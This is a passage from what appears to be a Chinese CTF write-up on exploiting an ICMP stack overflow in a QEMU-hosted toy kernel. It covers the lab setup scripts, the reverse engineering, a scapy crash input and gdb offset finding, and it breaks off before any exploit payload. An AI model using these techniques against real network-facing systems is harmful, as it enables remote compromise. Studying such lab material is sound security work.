<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">7</span>a <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line">hex(<span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span>) = <span class="number">0x18584</span></span><br><span class="line">hex(<span class="number">0x1</span> + <span class="number">0x8584</span>) = <span class="number">0x8585</span></span><br><span class="line">hex(~<span class="number">0x8d85</span> &amp; <span class="number">0xffff</span>) = <span class="number">0x7a7a</span></span><br><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">7</span>a <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：即使不计算效验和也可以拿到 ping 回包</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhj082/article/details/80518322">如何计算icmp校验和</a></li>
<li><a target="_blank" rel="noopener" href="http://yaxin-cn.github.io/Python/icmp-packet-checksum-with-python.html">icmp包检验和计算方法及python实现</a></li>
</ul>
<p><strong>理解 run.sh 中的信息</strong></p>
<p>生成一个 tap100 虚拟网卡，ip为10.10.10.2：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap100 -u nobody</span><br><span class="line">sudo ifconfig tap100 10.10.10.2/24</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tap100: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span>  netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  broadcast <span class="number">10.10</span><span class="number">.10</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">6</span>c7a:<span class="number">64f</span>f:fe7a:<span class="number">4b</span>d3  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">6</span>e:<span class="number">7</span>a:<span class="number">64</span>:<span class="number">7</span>a:<span class="number">4b</span>:d3  txqueuelen <span class="number">1000</span>  (以太网)</span><br><span class="line">        RX packets <span class="number">0</span>  bytes <span class="number">0</span> (<span class="number">0.0</span> B)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">136</span>  bytes <span class="number">15443</span> (<span class="number">15.4</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>对 Linux 防火墙进行设置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT </span><br><span class="line">sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10</span><br><span class="line">sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2</span><br></pre></td></tr></table></figure>
<ul>
<li><p>在 filter 表中：</p>
<ul>
<li>开启转发（不加-t参数默认表）</li>
<li>拒绝 ICMP echo-request（Ping请求）的接受</li>
</ul>
</li>
<li><p>在 nat 表中：</p>
<ul>
<li>把所有将要经过本机路由（预路由）的 ICMP 报文的目标IP全部换成 10.10.10.10（也就是说，只有 10.10.10.10 才能 ping 进虚拟机）</li>
<li>处理好回包路径，将源IP地址均设置为 tap100 网卡的地址</li>
</ul>
</li>
</ul>
<p>开启IP转发：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 系统默认是禁止数据包转发的</li>
<li>所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包时，根据数据包的目的IP地址将包发往本机另一网卡，该网卡根据路由表继续发送数据包</li>
</ul>
<p>设置 flag 权限：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -f /tmp/flag.txt</span><br><span class="line">sudo cp flag.txt /tmp</span><br><span class="line">sudo chmod 644 /tmp/flag.txt</span><br><span class="line">sudo chown nobody /tmp/flag.txt</span><br></pre></td></tr></table></figure>
<p>利用 setpriv 设置虚拟机的权限，并且启动虚拟机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo setpriv --reuid=nobody --regid=netdev --init-groups \</span><br><span class="line">    timeout 60 \</span><br><span class="line">    qemu-system-i386 -cdrom kernel.iso \</span><br><span class="line">    -hda /tmp/flag.txt \</span><br><span class="line">    -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \</span><br><span class="line">    -m 64M -display none \</span><br><span class="line">    -monitor /dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>QEMU 模拟运行的 x86 简易裸机系统（和目标的交互方式只有 ping）</li>
<li>PS：-display none，不显示 qemu 界面</li>
</ul>
<p>为了调试虚拟机，需要写一个 gdb.sh：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap100 -u nobody</span><br><span class="line">sudo ifconfig tap100 10.10.10.2/24</span><br><span class="line"></span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT</span><br><span class="line">sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10</span><br><span class="line">sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2</span><br><span class="line">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</span><br><span class="line"></span><br><span class="line">while true;</span><br><span class="line">do</span><br><span class="line">    sudo rm -f /tmp/flag.txt</span><br><span class="line">    sudo cp flag.txt /tmp</span><br><span class="line">    sudo chmod 644 /tmp/flag.txt</span><br><span class="line">    sudo chown nobody /tmp/flag.txt</span><br><span class="line">    qemu-system-i386 -cdrom kernel.iso \</span><br><span class="line">        -hda /tmp/flag.txt \</span><br><span class="line">        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \</span><br><span class="line">        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \</span><br><span class="line">        -m 64M -nographic \</span><br><span class="line">        -s -S \</span><br><span class="line">        -monitor /dev/null</span><br><span class="line">    sleep 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<ul>
<li>前面和 run.sh 一模一样，后面加上 <code>-s -S</code> 方便调试</li>
<li><code>-display none</code>（不显示 qemu）要改为 <code>-nographic</code>（关闭图像界面），不然 gdb 连接会时常断开</li>
</ul>
<p><strong>死亡之 ping</strong></p>
<p>最简单的基于IP的攻击可能要数著名的死亡之 ping，这种攻击主要是由于单个包的长度超过了IP协议规范所规定的包长度</p>
<p>死亡之 ping 的工作原理：</p>
<ul>
<li>首先是因为以太网长度有限，IP包片段被分片，当一个IP包的长度超过以太网帧的最大尺寸（以太网头部和尾部除外）时，包就会被分片，作为多个帧来发送，接收端的机器提取各个分片，并重组为一个完整的IP包，在正常情况下，IP头包含整个IP包的长度，当一个IP包被分片以后，头只包含各个分片的长度，分片并不包含整个IP包的长度信息，因此IP包一旦被分片，重组后的整个IP包的总长度只有在所在分片都接受完毕之后才能确定</li>
<li>在IP协议规范中规定了一个IP包的最大尺寸，包的重组代码所分配的内存区域也不会超过这个最大尺寸，这样，超大的包一旦出现，包当中的额外数据就会被写入其他正常区域，是一种典型的缓存溢出（Buffer Overflow）攻击</li>
<li>由于使用 ping 工具很容易完成这种攻击，以至于它也成了这种攻击的首选武器，预防死亡之 ping 的最好方法是对操作系统打补丁，使内核将不再对超过规定长度的包进行重组</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://www.joshua317.com/article/50">简单的Dos攻击-死亡之Ping</a></p>
<p><strong>入侵思路</strong></p>
<p>漏洞点就是“死亡之 ping”，icmp 包的数据过长引发的栈溢出，现在问题的关键就是找到处理 icmp 包的系统函数，然后分析其栈帧，看看能不能劫持程序执行 shellcode</p>
<p>IDA 分析如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_10000C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_1089E7(&amp;dword_10B000, <span class="number">0</span>, (<span class="keyword">char</span> *)&amp;dword_10C0D0 - (<span class="keyword">char</span> *)&amp;dword_10B000);</span><br><span class="line">  sub_10899B();</span><br><span class="line">  sub_106C4A();</span><br><span class="line">  sub_107AB9(&amp;unk_200000, dword_100000);</span><br><span class="line">  sub_107F34(&amp;unk_300000);</span><br><span class="line">  sub_1076D1();</span><br><span class="line">  sub_103287();</span><br><span class="line">  sub_103404();</span><br><span class="line">  sub_10063B();</span><br><span class="line">  sub_102D25();</span><br><span class="line">  sub_1025A8();</span><br><span class="line">  sub_1029D4();</span><br><span class="line">  sub_107888();</span><br><span class="line">  sub_1034AB();</span><br><span class="line">  dword_10C0D0 = sub_107E9E(<span class="number">1024</span>, <span class="number">0x10000</span>);</span><br><span class="line">  sub_103910(<span class="number">0</span>);</span><br><span class="line">  sub_104536(<span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, dword_10C0D0);</span><br><span class="line">  sub_1083B7(<span class="string">&quot;load flag:%s\n&quot;</span>);                 <span class="comment">// printf</span></span><br><span class="line">  sub_1083B7(<span class="string">&quot;ping me...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( unk_10C264 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_101F9F((<span class="keyword">int</span>)&amp;unk_10C8A0 + <span class="number">12</span>, unk_10C264 - <span class="number">12</span>, (<span class="keyword">int</span>)&amp;unk_10C280, &amp;dword_10C878);</span><br><span class="line">    unk_10C264 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_10C878 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_101F05((<span class="keyword">int</span>)&amp;unk_10C280, dword_10C878);</span><br><span class="line">    dword_10C878 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就是这个题目最恶心的地方了，所有函数都没有符号（包括库函数），要理解程序必须先把库函数找出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- sub_108AA9：<span class="built_in">memcpy</span></span><br><span class="line">- sub_1089E7：<span class="built_in">memset</span></span><br><span class="line">- sub_1083B7：<span class="built_in">printf</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里推荐从高地址到低地址挨着看，找到 memcpy 就差不多了</li>
</ul>
<p>在调试的同时发送测试数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">send(IP(dst=<span class="string">&quot;10.10.10.10&quot;</span>)/ICMP()/(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1000</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>在执行 sub_101F9F 后，程序出现 “a”*0x1000 ，由此判断 sub_101F9F 就是 ICMP Echo Request 函数</li>
<li>那么 sub_101F05 极有可能是 ICMP Echo Reply 函数</li>
</ul>
<p>分析 sub_101F9F 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_DWORD *__cdecl <span class="title">sub_101F9F</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, _DWORD *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+4h] [ebp-214h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">512</span>]; <span class="comment">// [esp+8h] [ebp-210h] BYREF 这里可能有溢出</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+208h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+20Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = a1;</span><br><span class="line">    v5 = *(<span class="keyword">unsigned</span> __int16 *)(a1 + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_102214(v10 + <span class="number">14</span>, a2 - <span class="number">14</span>, (<span class="keyword">int</span>)v8, &amp;v7);<span class="comment">// 跟进这个函数,查看v8的值</span></span><br><span class="line">    &#125;</span><br><span class="line">      ......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = a4;</span><br><span class="line">    *a4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 v8 十分可疑，所以先进入 sub_102214 函数分析 v8 的逻辑</li>
<li>sub_102214 函数中有个 memcpy，在 GDB 中查看它的信息：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x10233f</span>    call   <span class="number">0x108aa9</span>                      &lt;<span class="number">0x108aa9</span>&gt; <span class="comment">/* memcpy */</span></span><br><span class="line"> </span><br><span class="line">   <span class="number">0x102344</span>    add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x102347</span>    mov    eax, dword ptr [ebp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x10234a</span>    mov    dword ptr [ebp - <span class="number">0x18</span>], eax</span><br><span class="line">   <span class="number">0x10234d</span>    mov    eax, dword ptr [ebp - <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x102350</span>    movzx  edx, byte ptr [eax]</span><br><span class="line">   <span class="number">0x102353</span>    <span class="keyword">and</span>    edx, <span class="number">0xf</span></span><br><span class="line">   <span class="number">0x102356</span>    <span class="keyword">or</span>     edx, <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x102359</span>    mov    byte ptr [eax], dl</span><br><span class="line">   <span class="number">0x10235b</span>    mov    eax, dword ptr [ebp - <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x10235e</span>    movzx  edx, byte ptr [eax]</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0x1907d78</span> —▸ <span class="number">0x1907dd8</span> —▸ <span class="number">0x20a0a0a</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0x1907d7c</span> —▸ <span class="number">0x10c8d2</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0x1907d80</span> —▸ <span class="number">0x5c4</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0x1907d84</span> —▸ <span class="number">0xdc05</span> —▸ <span class="number">0x12cec81</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0x1907d88</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0x1907d8c</span> —▸ <span class="number">0x1907dd4</span> —▸ <span class="number">0xf4f40000</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0x1907d90</span> —▸ <span class="number">0x10c8ce</span> —▸ <span class="number">0xf4ec0008</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│     <span class="number">0x1907d94</span> —▸ <span class="number">0x5dc05c8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">0x10233f</span></span><br><span class="line">   f <span class="number">1</span> <span class="number">0x10202b</span></span><br><span class="line">   f <span class="number">2</span> <span class="number">0x10014b</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x /<span class="number">20</span>gx <span class="number">0x10c8d2</span></span><br><span class="line"><span class="number">0x10c8d2</span>:	<span class="number">0x6161616100000000</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c8e2</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c8f2</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c902</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x10c912</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<ul>
<li>memcpy(0x1907dd8 ,0x10c8d2 ,0x5c4)：把 ping 的数据复制到栈上的一个地址</li>
<li>执行到 ret 指令前，看看 offset 为多少：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x1020c5</span>    ret    &lt;<span class="number">0x10014b</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x10014b</span>    add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x10014e</span>    mov    eax, <span class="number">0x10c264</span></span><br><span class="line">   <span class="number">0x100154</span>    mov    dword ptr [eax], <span class="number">0</span></span><br><span class="line">   <span class="number">0x10015a</span>    mov    eax, <span class="number">0x10c878</span></span><br><span class="line">   <span class="number">0x100160</span>    mov    eax, dword ptr [eax]</span><br><span class="line">   <span class="number">0x100162</span>    test   eax, eax</span><br><span class="line">   <span class="number">0x100164</span>    je     <span class="number">0x10018d</span>                      &lt;<span class="number">0x10018d</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x100166</span>    mov    eax, <span class="number">0x10c878</span></span><br><span class="line">   <span class="number">0x10016c</span>    mov    eax, dword ptr [eax]</span><br><span class="line">   <span class="number">0x10016e</span>    sub    esp, <span class="number">8</span></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0x1907fd4</span> —▸ <span class="number">0x10014b</span> —▸ <span class="number">0xc710c483</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0x1907fd8</span> —▸ <span class="number">0x10c8ac</span> —▸ <span class="number">0xffffffff</span> —▸ <span class="number">0xff5300</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0x1907fdc</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0x1907fe0</span> —▸ <span class="number">0x10c280</span> —▸ <span class="number">0x1e0f4e06</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0x1907fe4</span> —▸ <span class="number">0x10c878</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0x1907fe8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0x1907fec</span> —▸ <span class="number">0x10000</span> —▸ <span class="number">0x1a67</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│ ebp <span class="number">0x1907ff0</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">0x1020c5</span></span><br><span class="line">   f <span class="number">1</span> <span class="number">0x10014b</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; distance <span class="number">0x1907fd4</span> <span class="number">0x1907dd8</span></span><br><span class="line"><span class="number">0x1907fd4</span>-&gt;<span class="number">0x1907dd8</span> is <span class="number">-0x1fc</span> bytes (<span class="number">-0x7f</span> words)</span><br></pre></td></tr></table></figure>
<ul>
<li>为了尽量不破坏栈帧，我们需要尽可能收集 esp 之前的数据</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x1907fd4</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1907fb4</span> —▸ <span class="number">0x1083d6</span> —▸ <span class="number">0x8b10c483</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│  <span class="number">0x1907fb8</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│  <span class="number">0x1907fbc</span> —▸ <span class="number">0x1907fdc</span> —▸ <span class="number">42</span> —▸ <span class="number">0xd442f000</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│  <span class="number">0x1907fc0</span> —▸ <span class="number">0x10c280</span> —▸ <span class="number">0x1e0f4e06</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│  <span class="number">0x1907fc4</span> —▸ <span class="number">0x10c8ac</span> —▸ <span class="number">0xffffffff</span> —▸ <span class="number">0xff5300</span> —▸ <span class="number">0</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│  <span class="number">0x1907fc8</span> —▸ <span class="number">0x10a6b4</span> —▸ <span class="number">0</span> —▸ <span class="number">0xf000ff53</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│  <span class="number">0x1907fcc</span> —▸ <span 